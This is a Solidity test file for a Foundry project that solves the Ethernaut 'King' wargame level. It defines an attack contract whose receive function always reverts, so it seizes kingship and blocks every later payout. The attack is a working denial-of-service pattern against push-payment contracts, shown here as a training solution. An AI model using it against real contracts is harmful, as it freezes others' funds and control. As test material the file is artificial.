// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/King/King.sol";
import "../src/King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingTest is Test {
    Ethernaut private _ethernaut;
    KingFactory private _kingFactory;
    King private _king;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 2 ether);
        _ethernaut.registerLevel(_kingFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance{value: 1 ether}(
            _kingFactory
        );
        _king = King(payable(instance));
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_king)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _kingFactory = new KingFactory();
    }

    function testKingHack() public testWrapper {
        KingHack kingHack = new KingHack(address(_king));
        uint256 prize = _king.prize();
        kingHack.attack{value: prize}(prize);
    }
}

contract KingHack {
    address public challengeAddress;

    constructor(address _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function attack(uint256 prize) public payable {
        (bool success, ) = payable(challengeAddress).call{value: prize}("");
        require(success);
    }

    receive() external payable {
        require(false);
    }
}
